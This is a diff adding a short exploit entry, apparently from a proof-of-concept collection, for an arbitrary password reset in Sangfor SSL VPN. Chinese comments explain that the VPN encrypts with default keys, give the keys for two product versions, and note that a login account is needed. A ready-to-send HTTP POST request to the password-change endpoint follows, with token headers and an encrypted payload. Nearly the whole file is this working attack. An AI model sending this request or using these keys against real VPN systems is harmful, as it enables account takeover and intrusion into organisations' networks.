@@ -1,0 +1,10 @@
+# 深信服SSL VPN任意密码重置
+# 信服VPN加密算法使用了默认的key,攻击者构利用key构造重置密码数据包从而修改任意用户的密码利用:需要登录账号M7.6.6R1版本默认key为20181118，M7.6.1版本默认key为20100720
+POST /por/changepwd.csp?acid=80002164&bid=hd_tag_m8mv25j3 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25j3
+RM-PRO-Token: fddfbebe88f0929d31974d8ce8860a31
+RM-PRO-Time: 1742808471722
+User-Agent: curl/7.83.1
+
+sessReq=clusterd&sessid=0&str=26c2ebe58a8274ba6c3dcd340cb38a1bf052267106947f980c32f8d7b521ecb00b78a1c0d94aa381514751b5a2e5ba486d7e4f30b825315e985867749e0ad4b02b4c3f0442&len=138
